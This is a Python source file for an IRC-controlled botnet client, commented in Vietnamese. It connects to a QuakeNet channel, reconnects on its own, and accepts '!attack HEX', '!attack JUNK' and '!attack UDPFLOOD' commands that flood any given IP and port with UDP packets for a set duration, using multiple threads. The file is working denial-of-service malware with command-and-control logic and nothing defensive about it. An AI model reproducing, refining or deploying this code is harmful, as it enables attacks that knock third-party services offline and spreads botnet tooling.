import irc.bot
import irc.connection
import socket
import time
import random
import string
import ssl
import signal
import threading
import logging

logging.basicConfig(
    level=logging.ERROR,
    format="[%(asctime)s] [%(process)s] [%(levelname)s] %(message)s",
)
logger = logging.getLogger(__name__)


class SimpleBot(irc.bot.SingleServerIRCBot):
    def __init__(self, channel, server, port=6697, use_ssl=True):
        nickname = self.generate_random_nickname()

        # ✅ FIX SSL: PROTOCOL_TLS_CLIENT + tắt verify (giữ hành vi ban đầu)
        if use_ssl:
            _ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            _ssl_context.check_hostname = False
            _ssl_context.verify_mode = ssl.CERT_NONE
            factory = irc.connection.Factory(wrapper=_ssl_context.wrap_socket)
        else:
            factory = irc.connection.Factory()

        super().__init__(
            [(server, port)], nickname, nickname, connect_factory=factory
        )
        self.channel = channel
        self.stop_event = threading.Event()   # Fix #3 + điều khiển shutdown
        self._connected = False               # theo dõi trạng thái kết nối
        self._reconnect_delay = 5             # delay ban đầu (giây)
        self._reconnect_timer = None          # Timer cho auto-retry

    def generate_random_nickname(self):
        return "".join(random.choices(string.ascii_letters + string.digits, k=8))

    def on_welcome(self, connection, event):
        if self._connected:
            return  # tránh join trùng khi reconnect thành công
        logger.info("Connected & welcome. Joining %s...", self.channel)
        self._connected = True
        self._reconnect_delay = 5   # reset backoff sau khi kết nối OK
        connection.join(self.channel)

    # ✅ Auto-retry: ngắt/nối IRC → tự động thử reconnect (chỉ khi chưa shutdown)
    def on_disconnect(self, connection, event):
        logger.info("Disconnected from server.")
        self._connected = False
        if not self.stop_event.is_set():
            self._schedule_reconnect()

    # ✅ Schedule lần reconnect kế tiếp (daemon timer → không chặn shutdown)
    def _schedule_reconnect(self):
        if self._reconnect_timer is not None:
            self._reconnect_timer.cancel()   # hủy timer cũ nếu còn tồn tại

        logger.info("Retrying connection in %ss...", self._reconnect_delay)
        self._reconnect_timer = threading.Timer(
            self._reconnect_delay, self._reconnect
        )
        self._reconnect_timer.daemon = True
        self._reconnect_timer.start()

    # ✅ Thực thi thử kết nối lại + backoff lũy thừa (5→10→20→30s)
    def _reconnect(self):
        try:
            if not self.stop_event.is_set():
                self.start()   # SingleServerIRCBot -> thử _connect() lần nữa
        except Exception as e:
            logger.error("Reconnect failed: %s", e)
        finally:
            self._reconnect_delay = min(self._reconnect_delay * 2, 30)

    def on_pubmsg(self, connection, event):
        message = event.arguments[0].strip()
        sender = event.source.nick

        if message.startswith("!attack HEX"):
            params = message.split()
            if len(params) == 5:
                self.attack_hex(connection, params[2], int(params[3]), int(params[4]))
            else:
                connection.privmsg(self.channel, "Usage: !attack HEX <ip> <port> <duration>")

        elif message.startswith("!attack JUNK"):
            params = message.split()
            if len(params) == 5:
                self.attack_junk(connection, params[2], int(params[3]), int(params[4]))
            else:
                connection.privmsg(self.channel, "Usage: !attack JUNK <ip> <port> <duration>")

        elif message.startswith("!attack UDPFLOOD"):
            params = message.split()
            if len(params) == 5:
                self.attack_udp_flood(connection, params[2], int(params[3]), int(params[4]))
            else:
                connection.privmsg(self.channel, "Usage: !attack UDPFLOOD <ip> <port> <duration>")

        # ✅ Lệnh dừng bot hoàn toàn (dọn dẹp + stop auto-retry)
        elif message.startswith("!shutdown"):
            logger.info("Shutdown command received from %s.", sender)
            self.stop_event.set()
            if self._reconnect_timer is not None:
                self._reconnect_timer.cancel()
            try:
                bot.disconnect()
            except Exception as e:
                logger.warning("Error during disconnect: %s", e)

    # --- Fix #2 (socket): tạo 1 lần, đóng ở finally ---
    def attack_hex(self, connection, ip, port, duration):
        payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            while not self.stop_event.is_set() and time.time() < end_time:
                for _ in range(6):
                    sock.sendto(payload, (ip, port))
        finally:
            sock.close()

    def attack_junk(self, connection, ip, port, duration):
        payload = b"\x00" * 64
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            while not self.stop_event.is_set() and time.time() < end_time:
                for _ in range(3):
                    sock.sendto(payload, (ip, port))
        finally:
            sock.close()

    def attack_udp_flood(self, connection, ip, port, duration):
        manager = UDPFloodManager(
            host=ip, port=port, timeout=duration, max_threads=10,
            stop_event=self.stop_event,
        )
        manager.start()
        manager.join()


class UDPFlood(threading.Thread):
    def __init__(self, host, port, timeout, total_sent_fn, stop_event):
        super().__init__()
        self.host = host
        self.port = port
        self.timeout = timeout
        self.total_sent_fn = total_sent_fn
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.stop_event = stop_event

    def message(self):
        chunk = "A" * 1024 * 2
        self.total_sent_fn(len(chunk))
        return chunk

    def run(self):
        end_time = time.time() + self.timeout
        while not self.stop_event.is_set() and time.time() < end_time:
            self.sock.sendto(self.message().encode(), (self.host, self.port))
        self.sock.close()


class UDPFloodManager(threading.Thread):
    def __init__(self, host, port, timeout, max_threads, stop_event):
        super().__init__()
        self.host = host
        self.port = port
        self.timeout = timeout
        self.max_threads = max_threads
        self.stop_event = stop_event
        self.threads = []
        self.total_sent = 0
        self.lock = threading.Lock()   # Fix #1 thread-safety

    def update_data(self, n):
        with self.lock:
            self.total_sent += n

    def run(self):
        for _ in range(self.max_threads):
            thread = UDPFlood(
                host=self.host, port=self.port, timeout=self.timeout,
                total_sent_fn=self.update_data, stop_event=self.stop_event,
            )
            thread.start()
            self.threads.append(thread)

        for thread in self.threads:
            thread.join()


if __name__ == "__main__":
    CHANNEL = "#anontoken"
    SERVER = "irc.quakenet.org"   # ✅ Đổi server
    PORT = 6667                   # ✅ Port plaintext (không SSL) của Quakenet

    bot = SimpleBot(CHANNEL, SERVER, PORT, use_ssl=False)  # ✅ Bỏ SSL

    def handle_signal(signum, frame):
        logger.info("Received signal %s; shutting down gracefully...", signum)
        bot.stop_event.set()                       # dừng auto-retry + flood threads
        if bot._reconnect_timer is not None:
            bot._reconnect_timer.cancel()          # hủy timer reconnect
        try:
            bot.disconnect()
        except Exception as e:
            logger.warning("Error during disconnect: %s", e)

    signal.signal(signal.SIGINT, handle_signal)   # Ctrl+C
    signal.signal(signal.SIGTERM, handle_signal)  # SIGTERM

    try:
        bot.start()  # Chặn main thread đến khi disconnect
    except irc.client.ServerConnectionError as ex:
        logger.error("Failed to connect to %s:%s: %s", SERVER, PORT, ex)
        logger.info("Server có thể không reachable. "
                    "Hãy kiểm tra tên server / mạng.")
    except KeyboardInterrupt:
        logger.info("KeyboardInterrupt; stopping flood threads...")
    finally:
        bot.stop_event.set()
        if bot._reconnect_timer is not None:
            bot._reconnect_timer.cancel()
        try:
            bot.disconnect()
        except Exception:
            pass